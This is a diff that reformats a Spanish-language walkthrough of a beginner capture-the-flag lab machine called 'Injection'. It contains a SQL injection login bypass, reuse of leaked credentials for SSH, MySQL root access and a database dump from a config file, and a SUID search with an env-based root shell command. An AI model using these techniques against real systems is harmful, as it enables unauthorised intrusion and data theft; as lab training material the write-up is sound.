@@ -1,112 +1,164 @@
-Nombre de la máquina: Injection
-Dificultad: Muy fácil 
-Tiempo: 1 hora
+# Máquina: Injection
 
+- **Dificultad:** Muy fácil  
+- **Tiempo estimado:** 1 hora
 
-Empezamos con un escaneo normal:
+---
 
-`
+## 🔍 Escaneo inicial
+
+Ejecutamos un escaneo básico con `nmap`:
+
+```bash
 nmap 172.17.0.3
-`
+```
 
-En el que obtenemos como respuesta que los puertos 22/TCP y 80/TCP están abiertos. 
+Obtenemos que los puertos abiertos son:
 
-Al tener esta información, podemos ser ya un poco más especificos e intentar obtener más datos que nos puedan ayudar:
+- **22/TCP** → SSH  
+- **80/TCP** → HTTP
 
-`
+Hacemos un escaneo más detallado sobre estos puertos:
+
+```bash
 nmap 172.17.0.3 -sV -p 22,80
-`
+```
 
-Obtenemos como respuesta:
+**Resultado:**
+
+```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+```
 
+---
 
-Como en el puerto 80/TCP está corriendo una página web, probaremos a poner en nuestro navegador 172.17.0.3 para ver que tipo de página es. 
-La web que está alojando Apache es una página de login, como la máquina se llama Injection, suponemos que será algo relacionado con SQLInjection y probaremos a introducir en el campo del nombre " admin' or 1=1; " y la contraseña cualquier cosa. 
+## 🌐 Análisis Web
 
-Con eso hemos conseguido acceder y visualizar el siguiente mensaje:
+Visitamos la dirección `http://172.17.0.3` en el navegador y encontramos una **página de login**.
 
-`Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78`
+Dado que la máquina se llama *Injection*, probamos una inyección SQL simple:
 
-Tenemos un nombre de usuario (Dylan) y un código (KJSDFG789FGSDF78) que puede ser una contraseña. Probamos a conectarnos por ssh con esas credenciales:
+- Usuario: `'admin' or 1=1;`
+- Contraseña: (cualquier valor)
 
-`
-ssh dylan@172.17.0.3 
-` 
+**Resultado:** Accedemos exitosamente y vemos el siguiente mensaje:
 
-El acceso fue exitoso. Ya estamos dentro de la máquina. Con sudo -l obtuve una respuesta de que el comando no existía asi que no se me ocurría una forma de poder escalar privilegios, estuve explorando las carpetas de ssh y tampoco encontré nada. Sin embargo, en las carpetas del servidor web, /var/www/html haciendo un cat del archivo config.php:
+```
+Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
+```
 
+Tenemos:
+- **Usuario:** Dylan
+- **Contraseña:** KJSDFG789FGSDF78
 
+---
+
+## 🔐 Acceso por SSH
+
+Probamos a conectarnos con esas credenciales:
+
+```bash
+ssh dylan@172.17.0.3
+```
+
+**Acceso exitoso.**
+
+---
+
+## 🛠️ Enumeración interna
+
+Intentamos enumerar con `sudo -l`, pero no está disponible.
+
+Explorando el sistema, encontramos un archivo interesante en:
+
+```
+/var/www/html/config.php
+```
+
+Contenido:
+
+```php
 return [
-        'db' => [
-                'host' => 'localhost',
-                'user' => 'root',
-                'passwd' => 'paso',
-                'dbname' => 'register',
-                'options' => [
-                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
-                ]
+    'db' => [
+        'host' => 'localhost',
+        'user' => 'root',
+        'passwd' => 'paso',
+        'dbname' => 'register',
+        'options' => [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
         ]
+    ]
 ];
+```
 
+---
 
+## 🧬 Acceso a MySQL
 
-Intentaremos conectarnos con mysql utilizando esas credenciales:
-`
+Usamos las credenciales para acceder a la base de datos:
+
+```bash
 mysql -u root -ppaso
-`
+```
 
-Hacemos un:
-`
+Una vez dentro:
+
+```sql
 show databases;
-`
-`
- use register;
-`
-`
+use register;
 select * from users;
-` 
+```
 
+**Resultado:**
 
-Aunque ya sabemos que existe una base de datos llamada register, pues aparece en config.php, obtenemos:
-
-
+```
 +----------+------------------+
 | username | passwd           |
 +----------+------------------+
 | dylan    | KJSDFG789FGSDF78 |
 +----------+------------------+
+```
 
+Ya conocíamos estos datos, pero ahora sabemos que tenemos control total sobre la base de datos.
 
-Era información que ya teniamos, pero probaremos lo siguiente:
-`
+Probamos a insertar y eliminar usuarios:
+
+```sql
 INSERT INTO users VALUES ('prueba','123456');
-`
-`
-INSERT INTO users VALUES ('prueba','123456');
-`
-`
-DELETE FROM users WHERE username='prueba1';
-`
+DELETE FROM users WHERE username='prueba';
+```
 
-Todas las consultas fueron exitosas, por lo que podemos decir que tenemos control sobre esa base de datos, pues podemos crear y eliminar los que queramos. Al igual que hacer un:
+También podemos exportar la base de datos:
 
-`
+```bash
 mysqldump --databases register -u root -ppaso > datos.sql
-`
+```
 
-Para obtener los datos.
+---
 
-Aunque aún no fuimos capaces de escalar privilegios en la máquina. 
+## 🧨 Escalada de privilegios
 
+Buscamos archivos con el bit SUID activado:
 
-`find / -perm -4000 -user root 2>/dev/null`
+```bash
+find / -perm -4000 -user root 2>/dev/null
+```
 
+Una opción útil es:
 
-`/usr/bin/env /bin/bash -p`
+```bash
+/usr/bin/env /bin/bash -p
+```
 
+---
+
+## ✅ Estado actual
+
+- ✅ Acceso SSH como **dylan**
+- ✅ Acceso completo a la base de datos MySQL
+- ⛔ No se ha logrado escalar privilegios a root (por ahora)
 
 
 
